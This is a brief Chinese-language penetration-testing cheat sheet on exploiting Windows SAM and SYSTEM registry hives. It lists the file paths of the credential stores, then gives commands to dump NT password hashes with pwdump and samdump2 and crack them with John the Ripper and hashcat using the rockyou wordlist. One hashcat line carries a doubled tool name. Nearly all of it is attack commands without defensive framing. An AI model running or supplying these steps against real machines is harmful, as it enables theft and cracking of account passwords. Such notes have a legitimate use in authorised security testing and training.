# SAM 和SYSTEM 文件位置-及其利用

```bash
C:\Windows\repair\SAM
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\SAM
C:\Windows\repair\system
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\RegBack\system
```

pwdump SYSTEM SAM > /root/hash.txt

samdump2 SYSTEM SAM -o sam.txt 

```bash
john -format=NT /root/hash.txt  
```

```bash
hashcathashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
```